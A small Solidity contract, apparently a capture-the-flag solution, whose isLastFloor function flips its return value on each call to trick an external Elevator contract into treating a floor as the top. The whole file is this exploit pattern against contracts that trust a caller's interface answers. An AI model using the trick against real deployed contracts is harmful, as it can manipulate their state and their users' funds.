// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    IElevator elevator;
    bool public flip = true;

    constructor(address _address) {
        elevator = IElevator(_address);
    }

    function isLastFloor(uint256 _number) public returns (bool) {
        flip = !flip;
        return flip;
    }

    function goTo(uint256 _floor) public {
        elevator.goTo(_floor);
    }
}
